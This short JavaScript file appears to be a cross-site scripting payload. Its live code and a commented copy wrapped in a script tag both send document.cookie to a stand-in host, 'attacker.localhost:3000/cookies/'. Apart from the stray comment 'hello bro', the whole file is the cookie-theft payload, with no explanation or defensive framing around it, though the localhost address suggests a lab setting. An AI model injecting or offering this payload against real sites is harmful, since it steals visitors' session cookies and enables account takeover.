fetch(
  "http://attacker.localhost:3000/cookies/" +
    encodeURIComponent(document.cookie)
).catch(() => {});
/* 
hello bro
<script>
  fetch("http://attacker.localhost:3000/cookies/" + encodeURIComponent(document.cookie))
    .catch(() => {});
</script>


*/
